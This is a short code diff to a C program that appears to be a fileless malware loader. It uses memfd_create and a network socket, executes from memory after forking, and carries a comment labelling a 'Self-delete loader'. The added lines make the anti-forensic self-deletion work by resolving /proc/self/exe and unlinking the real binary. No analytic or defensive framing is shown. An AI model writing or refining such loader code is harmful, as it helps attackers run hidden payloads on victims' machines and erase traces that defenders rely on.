@@ -40,6 +40,8 @@
 #include <string.h>
 #include <fcntl.h>
 #include <arpa/inet.h>
+#include <limits.h>
+#include <unistd.h>
 
 #ifndef __NR_memfd_create
 #define __NR_memfd_create 279
@@ -112,7 +114,16 @@ int main(int argc, char **argv) {
     close(sock);
 
     // Self-delete loader
-    unlink("/proc/self/exe");  
+    char exe_path[PATH_MAX] = {0};  
+    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
+    if (len != -1) {
+        exe_path[len] = '\0';  
+        if (unlink(exe_path) != 0) {
+            perror("unlink");
+        }
+    } else {
+        perror("readlink");
+    }  
 
     // Fork and execute from memory
     pid_t pid = fork();
